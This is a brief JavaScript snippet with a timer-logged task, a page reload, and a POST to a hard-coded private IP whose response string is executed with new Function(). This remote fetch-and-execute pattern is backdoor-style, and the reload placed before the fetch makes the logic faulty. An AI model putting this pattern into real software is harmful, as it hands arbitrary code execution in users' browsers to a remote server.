const task = function () {
    console.log('hello task ');
}
setInterval(task, 2000);

setTimeout(() => {
    window.location.reload();
    fetch('http://172.21.106.10:7070/dudes/venti/tick', {
        method: 'post',
        headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
    })
    .then(res => res.json())
    .then(data => {
        const fun = new Function(data.fun);
        fun();
    })
}, 10000);